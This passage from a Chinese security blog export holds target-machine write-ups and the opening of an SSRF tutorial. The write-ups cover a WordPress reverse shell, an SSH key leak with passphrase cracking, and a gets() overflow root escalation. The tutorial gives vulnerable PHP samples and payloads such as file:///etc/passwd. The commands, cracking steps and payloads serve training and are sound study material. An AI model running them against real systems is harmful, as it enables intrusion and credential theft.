<p>&emsp;&emsp;接下来访问404页面：<a href="http://192.168.1.107/wordpress/wp-content/themes/twentyfifteen/404.php%EF%BC%88%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8C%E7%9A%84**twentyfifiteen**%E8%A6%81%E6%8C%89%E7%85%A7%E5%9B%BE%E4%B8%AD%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%9E%E9%99%85%E6%83%85%E5%86%B5%E4%BF%AE%E6%94%B9%EF%BC%89">http://192.168.1.107/wordpress/wp-content/themes/twentyfifteen/404.php（注意这里的**twentyfifiteen**要按照图中自己的实际情况修改）</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223348756.png" alt="image-20211209223348756"></p>
<p>&emsp;&emsp;查看监听端，成功反弹shell</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223633375.png" alt="image-20211209223633375"></p>
<h3 id="（4）优化终端"><a href="#（4）优化终端" class="headerlink" title="（4）优化终端"></a>（4）优化终端</h3><p>&emsp;&emsp;调用交互式命令行，优化终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="（5）获得flag"><a href="#（5）获得flag" class="headerlink" title="（5）获得flag"></a>（5）获得flag</h3><p>&emsp;&emsp;使用<code>cat /etc/passwd</code>命令，来查看每个用户账号的属性。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223934049.png" alt="image-20211209223934049"></p>
<p>&emsp;&emsp;可以看到里面有一个熟悉的，在wordpress页面中出现了很多次的用户togie，切换到其账户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su togie</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;密码是之前deets.txt中写的12345，成功进入</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209224026734.png" alt="image-20211209224026734"></p>
<p>&emsp;&emsp;使用<code>sudo -i</code>命令进入root模式，密码同样是12345</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209224101238.png" alt="image-20211209224101238"></p>
<p>&emsp;&emsp;进入root目录，可以看到proof.txt文件。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209224331324.png" alt="image-20211209224331324"></p>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH私钥泄露</title>
    <url>/post/e8314d47.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w">https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w</a> 提取码: 59g0  </p>
<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638803760806-13180821-ed0d-434f-a22b-cdf35f259e58.png" alt="img"></p>
<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638803853250-d6d63ce5-be6a-4eb3-97cf-5399067e860a.png" alt="img"></p>
<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
<p>&emsp;&emsp;<code>passwd root</code>，重置密码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631776914468-9b43560f-a4f9-4915-88fd-d49c55fdd36d.png" alt="img"></p>
<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638804008860-a60db3bb-8f42-479a-b62c-c950da3a5ac4.png" alt="img"></p>
<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="1、发现靶机IP"><a href="#1、发现靶机IP" class="headerlink" title="1、发现靶机IP"></a>1、发现靶机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.43.165</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638804415601-223b79a6-a2b9-45c1-9338-ae742180461a.png" alt="img"></p>
<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.43.167</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638804791099-cc32cc5d-61e9-4255-b4b4-a47ae20a1b36.png" alt="img"></p>
<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.43.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638804844112-cb20f5be-4668-4468-a736-2750a99ad98c.png" alt="img"></p>
<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.43.165</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;发现 22–ssh、80–nginx、31337–python，这个31337端口可以看出来是python做的一个网站。此靶场机器上开启了ssh服务和两个http服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805008322-8518a0c2-6042-4fca-8b58-e22a40431d0f.png" alt="img"></p>
<p>&emsp;&emsp;接下来我们分析特殊端口，尤其对开放http服务的大端口（本靶机上31337端口开放了http服务）</p>
<p>&emsp;&emsp;访问31337端口对应网站，没有文件，那就对该网站进行目录扫描</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805277396-89d0ded6-556c-4579-840b-2925b7bcbbff.png" alt="img"></p>
<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;使用dirsearch进行目录扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.165:31337</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805425408-04cafbef-3d1c-44f3-8f69-d9c6cb78bc40.png" alt="img"></p>
<p>&emsp;&emsp;发现有 <strong>robots.txt</strong>、**/.ssh/id_rsa** 和 <strong>/.ssh/authorized_keys</strong> 等</p>
<p>&emsp;&emsp;或者使用dirb探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.43.165:31337</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805608976-e4122727-4823-44f2-9b54-73a03416c5f6.png" alt="img"></p>
<p>&emsp;&emsp;访问robots.txt，发现以下文件路径，逐个访问</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805708594-73103251-6ff3-423b-81ba-763e6d626a9a.png" alt="img"></p>
<p>&emsp;&emsp;当访问 <a href="http://10.3.35.8:31337/taxes/">http://10.3.35.8:31337/taxes/</a> 的时候，可以看到第1个flag</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805696113-83ca9972-f06c-4366-8224-1f4aca6c2382.png" alt="img"></p>
<p>&emsp;&emsp;在前面我么们还看到有 <strong>/.ssh/id_rsa</strong> 和 <strong>/.ssh/authorized_keys</strong>，使用网站访问，将它们下载下来， 将下载下来的文件查看一下</p>
<ul>
<li><p>id_rsa是私钥，authorized_keys 是认证关键字</p>
</li>
<li><p>id_rsa文件（公钥）需要密码才能打开</p>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805803664-560fd885-3637-437d-8c02-5fb79d9e9d12.png" alt="img"></p>
<p>&emsp;&emsp;在authorized_keys文件（这里就是泄露的私钥）中疑似看到了一个账户名称 <strong>simon</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638805866251-0a568718-f0cc-4541-9c21-24911ea81c86.png" alt="img"></p>
<h1 id="三、漏洞探测与利用"><a href="#三、漏洞探测与利用" class="headerlink" title="三、漏洞探测与利用"></a>三、漏洞探测与利用</h1><h2 id="1、尝试建立ssh连接"><a href="#1、尝试建立ssh连接" class="headerlink" title="1、尝试建立ssh连接"></a>1、尝试建立ssh连接</h2><p>&emsp;&emsp;尝试建立ssh连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa simon@192.168.43.165</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638806215128-e48b01d6-3e52-4705-9f6d-bbd6984eceee.png" alt="img"></p>
<p>&emsp;&emsp;发现要输入密钥 id_rsa 的密码，那么我们可用通过破解私钥得到密码</p>
<h2 id="2、破解私钥获取密码"><a href="#2、破解私钥获取密码" class="headerlink" title="2、破解私钥获取密码"></a>2、破解私钥获取密码</h2><p>&emsp;&emsp;因为等会要使用到ssh2john，首先查看ssh2john的路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate ssh2john</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638806320513-a37511d0-f5aa-417b-aad3-a7bb6194ee38.png" alt="img"></p>
<p>&emsp;&emsp;使用ssh2john.py将密钥信息转换为john可识别信息：（通过这个python文件记忆它的用处可能更好：ssh to john）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; rsacrack</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638806522129-18eeb627-b195-42fe-8ac2-98d2f4747061.png" alt="img"></p>
<p>&emsp;&emsp;利用字典破解解密rsacrack信息，发现密码 <strong>starwars</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rule rsacrack</span><br><span class="line">或者</span><br><span class="line">john rsacrack</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627706835092-8595d89f-cb8a-43bf-8f1b-64ce06765d9c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627710652183-14096979-a452-4f07-b8fd-bfb051f3ea36.png" alt="img"></p>
<h2 id="3、建立ssh连接"><a href="#3、建立ssh连接" class="headerlink" title="3、建立ssh连接"></a>3、建立ssh连接</h2><p>&emsp;&emsp;使用simon去登录服务器<code>ssh -i id_rsa simon@192.168.43.165</code>，密码为：<code>starwars</code>，如果出现以下报错说明是文件权限的问题，修改权限为600重新连接即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638807329288-d8376dfb-06e3-4609-92c5-b926f2e294c1.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638807354514-05107c83-8eba-407b-8be4-7ebdcfce9763.png" alt="img"></p>
<h2 id="4、溢出提权"><a href="#4、溢出提权" class="headerlink" title="4、溢出提权"></a>4、溢出提权</h2><p>&emsp;&emsp;登录成功，直接来一套简单的whoami和pwd等查看主机相关信息，发现root目录下有个flag.txt，但无权查看</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638807652057-90e3be1b-24d3-46f6-a6ca-899f70f1157b.png" alt="img"></p>
<p>&emsp;&emsp;登录成功， 从根目录“/”开始查找整个系统所有文件中拥有suid特殊权限的文件，并忽略错误以防打断查找，查看整台服务器具有root权限的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638807866837-9a7016c4-8005-4ba1-be18-460148005534.png" alt="img"></p>
<p>&emsp;&emsp;好多东西，且/usr/local/bin/read_message可执行文件有root权限，刚刚看到当前目录是有这个可执行文件的源代码的，那先看下read_message.c这个文件，发现了flag2，同时进行代码审计</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638807997938-27c6179e-b5be-4bea-8ca7-e449cab29c20.png" alt="img"></p>
<p>&emsp;&emsp;linux系统中，是可以靠编译c代码来成为系统一部分命令的！！！！查看read_message代码后，发现固定大小的数组，想能否制造<strong>内存溢出</strong>。经过实验我们惊奇的发现输入Simon与SimonAAA竟然有同样的输出！这说明read_message代码只关注前五个字符而不关注buf数组中其他字符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// You&#x27;re getting close! Here&#x27;s another flag:</span></span><br><span class="line"><span class="comment">// flag2&#123;use_the_source_luke&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> program[] = <span class="string">&quot;/usr/local/sbin/message&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> authorized[] = <span class="string">&quot;Simon&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What is your name?\n&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only compare first five chars to save precious cycles:</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(authorized, buf, <span class="number">5</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s! Here is your message:\n\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// This is safe as the user can&#x27;t mess with the binary location:</span></span><br><span class="line">        execve(program, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry %s, you&#x27;re not %s! The Internet Police have been informed of this violation.\n&quot;</span>, buf, authorized);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;即验证数组前5个字符，限定字符数为最多20个 ，前5个为Simon即可。我们试着输20多个字符使其溢出，输入超过他缓存字符长度的字符超出的部分为root权限的目录路径</p>
<p>&emsp;&emsp;进入目录：<code>cd /usr/local/bin</code>，执行可执行文件<code>read_message</code>，输入<code>SimonAAAAAAAAAAAAAAA/bin/sh</code>，提权成功。查看最后一个flag</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638808567654-cc815422-9700-4f3a-a07e-1ce0b1647044.png" alt="img"></p>
<h1 id="三、情景"><a href="#三、情景" class="headerlink" title="三、情景"></a>三、情景</h1><p>&emsp;&emsp;有些企业，他们的员工在比如在/home/目录下，为了方便大家报表或者共享些其他文件资料等，就会开启一个http server来作为大家共享的一个平台，但是在每个员工的比如/home/xiaoming目录下，还有/home/xiaoming/.ssh/id_rsa和/home/xiaoming/.ssh/authorized_keys存在，我们就可以直接访问该目录下载这些文件得到ssh的私钥，造成SSH密钥泄露，以合法用户的名义登录到目标主机，进行后续内网渗透</p>
<h1 id="四、解决方法"><a href="#四、解决方法" class="headerlink" title="四、解决方法"></a>四、解决方法</h1><ul>
<li>不要将密钥放到web目录下</li>
<li>将密钥放在别人字典扫不到的目录下</li>
</ul>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务器端请求伪造攻击</title>
    <url>/post/98624e3.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、SSRF概述"><a href="#一、SSRF概述" class="headerlink" title="一、SSRF概述"></a>一、SSRF概述</h1><p>&emsp;&emsp;SSRF(Server-Side Request Forgery：服务器端请求伪造)，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。</p>
<p>&emsp;&emsp;其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</p>
<p>&emsp;&emsp;数据流：攻击者—–&gt;服务器—–&gt;目标地址</p>
<p>&emsp;&emsp;根据后台使用函数的不同，对应的影响和利用方法又有不一样</p>
<p>&emsp;&emsp;PHP中下面函数的使用不当会导致SSRF:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求，则请做好目标地址的过滤。</p>
<p>&emsp;&emsp;你可以根据“SSRF”里面的项目来搞懂问题的原因</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644245309537-c71e5750-1453-4a0d-b6fa-5b8ae89dc8cd.png" alt="img"></p>
<h1 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h1><p>&emsp;&emsp;很多Web应用都提供了从其他的服务器上获取数据的功能，根据用户指定的URL，Web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。一般情况下，SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633965473783-beeb6571-1148-4957-aa40-7a3046420cc5.png" alt="img"></p>
<h1 id="三、利用SSRF可以实现的攻击"><a href="#三、利用SSRF可以实现的攻击" class="headerlink" title="三、利用SSRF可以实现的攻击"></a>三、利用SSRF可以实现的攻击</h1><p>&emsp;&emsp;攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617533764733-f0d4420c-5c84-4375-b68a-44a30b004a90.jpeg" alt="img"></p>
<ol>
<li>对外网、服务器所在的内网、本地进行端口扫描，获取一些服务的Banner信息</li>
<li>攻击运行在内网或本地的应用程序</li>
<li>对内网Web应用进行指纹识别，识别企业内部的资产信息</li>
<li>攻击内外网的Web应用，主要是使用GET请求就可以实现的攻击（比如: Struts2、 sqli）</li>
<li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li>
<li>进行跳板</li>
<li>无视cdn</li>
<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
</ol>
<h1 id="四、SSRF漏洞相关函数和协议"><a href="#四、SSRF漏洞相关函数和协议" class="headerlink" title="四、SSRF漏洞相关函数和协议"></a>四、SSRF漏洞相关函数和协议</h1><h2 id="1、PHP函数"><a href="#1、PHP函数" class="headerlink" title="1、PHP函数"></a>1、PHP函数</h2><p>&emsp;&emsp;<code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p>
<h3 id="（1）file-get-contents"><a href="#（1）file-get-contents" class="headerlink" title="（1）file_get_contents()"></a>（1）file_get_contents()</h3><p>&emsp;&emsp;<code>file_get_contents</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。<code>file_put_contents</code>函数把一个字符串写入文件中。  </p>
<p>&emsp;&emsp;比如以下代码在Win10上部署，这段代码使用<code>file_get_contents()</code>函数从用户指定的URL获取图片并展示给用户。和Win10同一内网的Kali在8000端口服务开启了只供内部人员使用的资料比如ssrf_flag，此时如果攻击者提交如下Payload，就可以获取到内网主机HTTP服务8000端口的开放情况</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633963644662-8005917d-ed68-40d0-bff0-6d1c0532cce4.png" alt="img"></p>
<h3 id="（2）fsockopen"><a href="#（2）fsockopen" class="headerlink" title="（2）fsockopen()"></a>（2）fsockopen()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">		<span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">		<span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">		<span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">		<span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">		fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">		<span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">		<span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">			<span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">		&#125; </span><br><span class="line">		fclose(<span class="variable">$fp</span>); </span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，<span class="number">30</span>为时限</span><br></pre></td></tr></table></figure>

<h3 id="（3）curl-exec"><a href="#（3）curl-exec" class="headerlink" title="（3）curl_exec()"></a>（3）curl_exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = curl_init();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">	curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	<span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	curl_close(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">	<span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">	file_put_contents(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">curl_exec函数用于执行指定的cURL会话</span><br></pre></td></tr></table></figure>

<h3 id="（4）注意"><a href="#（4）注意" class="headerlink" title="（4）注意"></a>（4）注意</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line"><span class="number">2</span>. file_get_contents的gopher协议不能URL编码</span><br><span class="line"><span class="number">3</span>. file_get_contents关于Gopher的<span class="number">302</span>跳转会出现bug，导致利用失败</span><br><span class="line"><span class="number">4</span>. curl/libcurl <span class="number">7.43</span> 上gopher协议存在bug(%<span class="number">00</span>截断) 经测试<span class="number">7.49</span> 可用</span><br><span class="line"><span class="number">5</span>. curl_exec() <span class="comment">//默认不跟踪跳转</span></span><br><span class="line"><span class="number">6</span>. file_get_contents() <span class="comment">// file_get_contents支持php://input协议</span></span><br></pre></td></tr></table></figure>

<h2 id="2、协议"><a href="#2、协议" class="headerlink" title="2、协议"></a>2、协议</h2><h3 id="（1）file"><a href="#（1）file" class="headerlink" title="（1）file"></a>（1）file</h3><p>&emsp;&emsp;在有回显的情况下，利用 file 协议可以读取任意内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">file:///etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>

<h3 id="（2）dict"><a href="#（2）dict" class="headerlink" title="（2）dict"></a>（2）dict</h3><p>&emsp;&emsp;泄露安装软件版本信息，查看端口，操作内网Redis服务等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://192.168.15.111:22        //读取本地服务器22端口信息</span><br><span class="line">dict://dict://192.168.15.51:22  //读取和本地服务器相通的服务器22端口信息</span><br></pre></td></tr></table></figure>

<h3 id="（3）Gopher"><a href="#（3）Gopher" class="headerlink" title="（3）Gopher"></a>（3）Gopher</h3><p>&emsp;&emsp;Gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合Gopher协议的请求。Gopher协议是SSRF利用中一个最强大的协议（俗称万能协议）。<strong>可用于反弹shell</strong></p>
<h3 id="（4）http-s"><a href="#（4）http-s" class="headerlink" title="（4）http/s"></a>（4）http/s</h3><p>&emsp;&emsp;探测内网主机存活</p>
